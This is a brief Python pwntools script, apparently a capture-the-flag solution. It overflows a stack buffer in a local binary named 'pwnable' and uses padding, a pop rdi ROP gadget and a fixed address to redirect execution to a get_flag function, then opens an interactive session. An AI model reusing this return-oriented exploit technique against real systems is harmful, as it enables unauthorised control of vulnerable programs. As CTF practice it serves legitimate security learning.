from pwn import *

get_flag_addr = 0x004005ea
#get_flag_addr = 0x004005fe
padding = "A" * 112
saved_ebp = "B" * 8

pop_rdi_gadget = p64(0x00400693)
canary = p64(0xdeadbeef)

payload= padding + saved_ebp + pop_rdi_gadget + canary + p64(get_flag_addr, endianness="little")

print "ADDRESS TO RETURN TO" + str(p64(get_flag_addr, endianness="little"))

binary = process("pwnable")
#binary = remote(url, puerto)

print binary.recv()

binary.sendline(payload)
binary.interactive()

